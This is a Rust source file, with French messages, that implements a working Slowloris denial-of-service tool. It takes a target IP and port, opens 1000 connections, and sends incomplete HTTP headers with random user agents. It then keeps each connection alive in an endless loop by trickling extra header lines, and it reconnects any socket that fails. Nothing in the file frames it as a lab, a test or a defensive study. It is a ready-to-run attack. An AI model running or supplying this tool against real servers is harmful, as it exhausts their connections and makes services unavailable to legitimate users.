use std::io::Write;
use std::net::{IpAddr, SocketAddr, TcpStream};
use rand::{random, Rng};
use clap::Parser;
use std::fs;

#[derive(Parser)]
struct Cli {
    ip: IpAddr,
    port: u16,
}

struct Socket {
    ip: IpAddr,
    port: u16,
}

impl Socket {
    pub fn create(&self, nb_sockets: usize) -> Vec<TcpStream> {
        let mut sockets = vec![];
        for _i in 0..nb_sockets {
            sockets.push(Socket::new_instance(&self));
        }
        sockets
    }

    pub fn new_instance(&self) -> TcpStream {
        let mut s = TcpStream::connect(SocketAddr::new(self.ip, self.port))
            .expect("Impossible de se connecter");
        s.write_all(
            format!(
                "GET /?{} HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                random::<i8>(),
                random_agent()
            ).as_bytes(),
        ).expect("Impossible d'envoyer les informations");
        s
    }
}

fn random_agent () -> String {
    let file = fs::read_to_string("user-agents.txt").expect("Impossible de lire le fichiers d'agents");
    let agent: Vec<&str> = file.lines().collect();
    let random_line = rand::thread_rng().gen_range(0..agent.len());

    agent[random_line].to_string()
}

fn main () {

    let  nb_sockets: usize = 1000;

    let args = Cli::parse();

    let instance = Socket {
        ip: args.ip,
        port: args.port
    };

    println!("Création des sockets...");

    let mut sockets: Vec<TcpStream> = instance.create(nb_sockets);

    println!("Début de l'attaque Slowloris...");
    loop {
        for socket in &mut sockets {
            match socket.write_all(format!("X-a: {}\r\n", random::<i8>()).as_bytes()) {
                Ok(_) => println!("Réussi !"),
                Err(_) => {
                    println!("Erreur : {:?}", socket);
                    *socket = instance.new_instance();
                },
            };
        }
    }
}